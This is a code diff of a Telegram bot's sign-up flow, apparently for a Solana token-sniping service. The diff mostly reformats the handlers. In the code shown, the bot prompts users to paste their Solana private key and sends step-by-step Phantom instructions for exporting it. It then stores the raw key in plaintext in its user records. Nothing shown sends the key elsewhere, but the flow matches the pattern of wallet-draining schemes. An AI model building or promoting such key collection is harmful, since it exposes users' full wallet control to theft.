@@ -647,75 +647,83 @@ bot.onText(/\/start/, async (msg) => {
         break;
   
       // — sustituimos el antiguo case 3 por este nuevo prompt con ayuda inmediata —
-    case 3:
+      case 3:
         user.username = text;
         user.step     = 4;
         saveUsers();
-  
-        // Prompt de private key + botón de ayuda
+        // Prompt de private key + ayuda
         await bot.editMessageText(
-          "🔑 Please enter your *Solana Private Key* or tap for help:",
-          {
-            chat_id: chatId,
-            message_id: msgId,
-            parse_mode: "Markdown",
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: "❓ How to get Phantom Private Key", callback_data: "show_phantom_pk" }
+            "🔑 Please enter your *Solana Private Key* or tap for help:",
+            {
+              chat_id: chatId,
+              message_id: msgId,
+              parse_mode: "Markdown",
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: "❓ How to get Phantom Private Key", callback_data: "show_phantom_pk" }
+                  ],
+                  [
+                    { text: "📘 More Help", url: "https://gemsniping.com/docs" }
+                  ]
                 ]
-              ]
+              }
             }
-          }
-        );
+          );
         // guardamos para borrarlo más adelante
         user.tempKeyPromptId = msgId;
         user.step = 4.1;
         saveUsers();
         break;
-
-  case 4.1:
-    // borramos input y el prompt de ayuda si existiera
-    if (user.tempHelpMsgId) {
-      await bot.deleteMessage(chatId, user.tempHelpMsgId).catch(() => {});
-      delete user.tempHelpMsgId;
-    }
-    await bot.deleteMessage(chatId, messageId).catch(() => {});
-    // aquí procesas la key…
-    try {
-      const keypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(text)));
-      user.privateKey      = text;
-      user.walletPublicKey = keypair.publicKey.toBase58();
-      user.step            = 5;
-      saveUsers();
-      // seguimos preguntando por referral/trial
-      await bot.sendMessage(
-        chatId,
-        "🎟️ Do you have a *referral code*?",
-        {
-          parse_mode: "Markdown",
-          reply_markup: {
-            inline_keyboard: [
-              [ { text: "✅ YES", callback_data: "referral_yes" } ],
-              [ { text: "❌ NO",  callback_data: "referral_no"  } ]
-            ]
-          }
-        }
-      );
-    } catch (err) {
-      await bot.sendMessage(chatId, "❌ Invalid private key. Please try again:");
-      user.step = 4;  // volver a mostrar el botón de ayuda
-      saveUsers();
-    }
-    break;
   
-      // … resto de pasos de registro …
+      case 4.1:
+        // 1) borramos el prompt de key
+        if (user.tempKeyPromptId) {
+          await bot.deleteMessage(chatId, user.tempKeyPromptId).catch(() => {});
+          delete user.tempKeyPromptId;
+        }
+        // 2) borramos la imagen de ayuda si existe
+        if (user.tempHelpMsgId) {
+          await bot.deleteMessage(chatId, user.tempHelpMsgId).catch(() => {});
+          delete user.tempHelpMsgId;
+        }
+        // 3) procesar la private key
+        try {
+          const keypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(text)));
+          user.privateKey      = text;
+          user.walletPublicKey = keypair.publicKey.toBase58();
+          user.step            = 5;
+          saveUsers();
+  
+          // 4) lanzamos la pregunta de referral
+          await bot.sendMessage(
+            chatId,
+            "🎟️ Do you have a *referral code*?",
+            {
+              parse_mode: "Markdown",
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "✅ YES", callback_data: "referral_yes" }],
+                  [{ text: "❌ NO",  callback_data: "referral_no"  }]
+                ]
+              }
+            }
+          );
+        } catch (err) {
+          // en caso de key inválida, reiniciamos al paso 4
+          await bot.sendMessage(chatId, "❌ Invalid private key. Please try again:");
+          user.step = 4;
+          saveUsers();
+        }
+        break;
+  
+      // … resto de pasos …
     }
   });
   
-  // ────────────────────────────────
+  // ─────────────────────────────────────────────
   // Callback para mostrar ayuda de Phantom Key
-  // ────────────────────────────────
+  // ─────────────────────────────────────────────
   bot.on("callback_query", async (query) => {
     if (query.data !== "show_phantom_pk") return;
     const chatId = query.message.chat.id;
@@ -726,26 +734,27 @@ bot.onText(/\/start/, async (msg) => {
       "https://framerusercontent.com/images/ISnZasMWb9w6SePLNUrOLbyg9b8.png",
       {
         caption:
-`1. Open Phantom  
-Unlock your Phantom extension or mobile app.
+  `1. Open Phantom  
+  Unlock your Phantom extension or mobile app.
   
-2. Go to Settings  
-Tap your profile → Settings.
+  2. Go to Settings  
+  Tap your profile → Settings.
   
-3. Security & Privacy  
-Select *Security & Privacy*.
+  3. Security & Privacy  
+  Select *Security & Privacy*.
   
-4. Export Private Key  
-Scroll and tap *Export Private Key*.
+  4. Export Private Key  
+  Scroll and tap *Export Private Key*.
   
-5. Authenticate  
-Approve with your password or biometrics.
+  5. Authenticate  
+  Approve with your password or biometrics.
   
-6. Copy & Secure  
-Copy the long string and paste here.`,
+  6. Copy & Secure  
+  Copy the long string and paste here.`,
         parse_mode: "Markdown"
       }
     );
+    // guardamos para poder borrarlo luego en el paso 4.1
     users[chatId].tempHelpMsgId = help.message_id;
     saveUsers();
   });
